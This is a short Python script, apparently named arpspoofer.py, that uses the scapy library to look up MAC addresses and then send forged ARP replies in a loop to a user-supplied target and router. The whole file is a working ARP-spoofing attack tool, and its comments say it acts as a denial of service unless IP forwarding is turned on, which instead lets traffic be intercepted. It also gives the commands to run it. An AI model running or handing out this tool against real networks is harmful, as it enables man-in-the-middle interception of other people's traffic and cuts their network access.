import scapy.all as scapy
from scapy.layers.l2 import Ether, ARP
import time

def get_mac_address(ip_address):
    broadcast_layer = Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2,verbose=False)[0]
    return answer[0][1].hwsrc

tx_ip = str(input('Enter Target IP: '))
rx_ip = str(input('Enter Router IP: '))

def spoof(router_ip, target_ip, target_mac, router_mac):
    packet1 = ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)  # sends packet to router from target(spoofed)
    packet2 = ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip) # Sends packet to target machine from router(spoofed)
    scapy.send(packet1)
    scapy.send(packet2)

target_ip = tx_ip
router_ip = rx_ip

# In the event there is an out of range error where the computer could not detect the mac address,
# Use this line in Home Terminal to manually get mac address : arp -a
# After that, hash out the line below to manually enter mac address
# target_mac = str(input('Enter Target MAC: '))

target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

try:
    while True:
        spoof(router_ip, target_ip, target_mac, router_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Closing ARP Spoofer')
    exit(0)

###
# If you run this program as it is, it works as a DoS (Denial of Service) Attack
# Because The internet could not be accessed from the Target Machine
# In order to let target machine access the internet,
# Enter these lines before running the Python File in Terminal(Root): echo 1 >> /proc/sys/net/ipv4/ip_forward
# To run the file in Terminal : python3 arpspoofer.py
###